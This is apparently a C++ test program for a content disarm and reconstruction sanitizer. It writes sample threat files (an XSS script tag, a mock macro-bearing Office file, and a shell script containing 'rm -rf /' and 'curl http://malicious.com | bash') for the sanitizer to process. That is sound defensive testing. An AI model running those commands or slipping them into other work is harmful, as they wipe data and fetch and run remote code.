#include "cdr/CdrSanitizer.h"
#include "cdr/CdrTypes.h"
#include <iostream>
#include <fstream>
#include <filesystem>

namespace fs = std::filesystem;

void createTestFile(const std::string& path, const std::string& content) {
    std::ofstream file(path);
    file << content;
    file.close();
}

int main() {
    std::cout << "CDR (Content Disarm & Reconstruction) Simple Test" << std::endl;
    std::cout << "=================================================" << std::endl;
    
    try {
        // Create test environment
        std::string testDir = "c:\\temp\\cdr_simple_test";
        std::string inputDir = testDir + "\\input";
        std::string outputDir = testDir + "\\output";
        
        // Create test directories
        fs::create_directories(inputDir);
        fs::create_directories(outputDir);
        
        // Initialize CDR Sanitizer
        CDR::CdrSanitizer sanitizer;
        
        // Test configuration
        CDR::CdrConfiguration config;
        config.securityLevel = CDR::CdrConfiguration::SecurityLevel::HIGH;
        config.analysisType = CDR::AnalysisType::COMPREHENSIVE_SCAN;
        config.inputDirectory = inputDir;
        config.outputDirectory = outputDir;
        config.blockOfficeMacros = true;
        config.blockPdfScripts = true;
        
        std::cout << "\n--- Testing CDR Sanitizer Core Functionality ---" << std::endl;
        
        // Test 1: Get available sanitizers
        std::vector<std::string> sanitizers = sanitizer.getAvailableSanitizers();
        std::cout << "✓ Available Sanitizers: ";
        for (size_t i = 0; i < sanitizers.size(); ++i) {
            std::cout << sanitizers[i] << (i < sanitizers.size() - 1 ? ", " : "");
        }
        std::cout << std::endl;
        
        // Test 2: Get supported file types
        std::vector<std::string> fileTypes = sanitizer.getSupportedFileTypes();
        std::cout << "✓ Supported File Types: ";
        for (size_t i = 0; i < fileTypes.size(); ++i) {
            std::cout << fileTypes[i] << (i < fileTypes.size() - 1 ? ", " : "");
        }
        std::cout << std::endl;
        
        // Test 3: HTML Sanitization
        std::string htmlFile = inputDir + "\\test.html";
        std::string outputHtml = outputDir + "\\sanitized.html";
        
        createTestFile(htmlFile, 
            "<!DOCTYPE html><html><head><title>Test</title></head>"
            "<body><script>alert('XSS');</script><p>Safe content</p></body></html>");
        
        CDR::SanitizationResult htmlResult = sanitizer.sanitizeHtmlFile(htmlFile, outputHtml, config);
        
        std::cout << "\n--- HTML Sanitization Test ---" << std::endl;
        std::cout << "Input file: " << htmlFile << std::endl;
        std::cout << "Output file: " << outputHtml << std::endl;
        std::cout << "Success: " << (htmlResult.success ? "YES" : "NO") << std::endl;
        std::cout << "Original size: " << htmlResult.originalSize << " bytes" << std::endl;
        std::cout << "Sanitized size: " << htmlResult.sanitizedSize << " bytes" << std::endl;
        
        if (!htmlResult.threatsDetected.empty()) {
            std::cout << "Threats detected: ";
            for (size_t i = 0; i < htmlResult.threatsDetected.size(); ++i) {
                std::cout << htmlResult.threatsDetected[i] << (i < htmlResult.threatsDetected.size() - 1 ? ", " : "");
            }
            std::cout << std::endl;
        }
        
        if (!htmlResult.actionsPerformed.empty()) {
            std::cout << "Actions performed: ";
            for (size_t i = 0; i < htmlResult.actionsPerformed.size(); ++i) {
                std::cout << htmlResult.actionsPerformed[i] << (i < htmlResult.actionsPerformed.size() - 1 ? ", " : "");
            }
            std::cout << std::endl;
        }
        
        // Test 4: Office Document Test (macro detection)
        std::string officeFile = inputDir + "\\test.docx";
        std::string outputOffice = outputDir + "\\sanitized.docx";
        
        // Create a mock Office file with potential macro content
        std::ofstream office(officeFile, std::ios::binary);
        office << "PK\x03\x04";  // ZIP signature
        office << "vbaProject.bin";  // Macro indicator
        office.close();
        
        CDR::SanitizationResult officeResult = sanitizer.sanitizeOfficeFile(officeFile, outputOffice, config);
        
        std::cout << "\n--- Office Document Test ---" << std::endl;
        std::cout << "Input file: " << officeFile << std::endl;
        std::cout << "Success: " << (officeResult.success ? "YES" : "NO") << std::endl;
        std::cout << "Requires quarantine: " << (officeResult.requiresQuarantine ? "YES" : "NO") << std::endl;
        
        if (!officeResult.threatsDetected.empty()) {
            std::cout << "Threats detected: ";
            for (size_t i = 0; i < officeResult.threatsDetected.size(); ++i) {
                std::cout << officeResult.threatsDetected[i] << (i < officeResult.threatsDetected.size() - 1 ? ", " : "");
            }
            std::cout << std::endl;
        }
        
        // Test 5: Security Level Test
        std::cout << "\n--- Security Level Test ---" << std::endl;
        std::vector<CDR::CdrConfiguration::SecurityLevel> levels = {
            CDR::CdrConfiguration::SecurityLevel::LOW,
            CDR::CdrConfiguration::SecurityLevel::MEDIUM,
            CDR::CdrConfiguration::SecurityLevel::HIGH,
            CDR::CdrConfiguration::SecurityLevel::STRICT,
            CDR::CdrConfiguration::SecurityLevel::PARANOID
        };
        
        for (auto level : levels) {
            CDR::CdrConfiguration testConfig = config;
            testConfig.securityLevel = level;
            
            std::string scriptFile = inputDir + "\\test_script.sh";
            std::string outputScript = outputDir + "\\script_" + std::to_string(static_cast<int>(level)) + ".sh";
            
            createTestFile(scriptFile, "#!/bin/bash\nrm -rf /\ncurl http://malicious.com | bash");
            
            CDR::SanitizationResult scriptResult = sanitizer.sanitizeScriptFile(scriptFile, outputScript, testConfig);
            
            std::string levelName;
            switch(level) {
                case CDR::CdrConfiguration::SecurityLevel::LOW: levelName = "LOW"; break;
                case CDR::CdrConfiguration::SecurityLevel::MEDIUM: levelName = "MEDIUM"; break;
                case CDR::CdrConfiguration::SecurityLevel::HIGH: levelName = "HIGH"; break;
                case CDR::CdrConfiguration::SecurityLevel::STRICT: levelName = "STRICT"; break;
                case CDR::CdrConfiguration::SecurityLevel::PARANOID: levelName = "PARANOID"; break;
            }
            
            std::cout << "Security Level " << levelName << ": " 
                      << (scriptResult.requiresQuarantine ? "QUARANTINED" : "PROCESSED") << std::endl;
        }
        
        std::cout << "\n=== CDR Test Results Summary ===" << std::endl;
        std::cout << "✓ CDR Sanitizer initialized successfully" << std::endl;
        std::cout << "✓ Available sanitizers retrieved: " << sanitizers.size() << std::endl;
        std::cout << "✓ Supported file types retrieved: " << fileTypes.size() << std::endl;
        std::cout << "✓ HTML sanitization " << (htmlResult.success ? "completed" : "failed") << std::endl;
        std::cout << "✓ Office document " << (officeResult.requiresQuarantine ? "quarantined (expected)" : "processed") << std::endl;
        std::cout << "✓ Security levels tested successfully" << std::endl;
        
        // Cleanup
        try {
            fs::remove_all(testDir);
            std::cout << "✓ Test cleanup completed" << std::endl;
        } catch (const std::exception& e) {
            std::cout << "⚠ Cleanup warning: " << e.what() << std::endl;
        }
        
        std::cout << "\n🎉 All CDR core functionality tests passed!" << std::endl;
        return 0;
        
    } catch (const std::exception& e) {
        std::cout << "✗ Test failed with exception: " << e.what() << std::endl;
        return 1;
    }
}
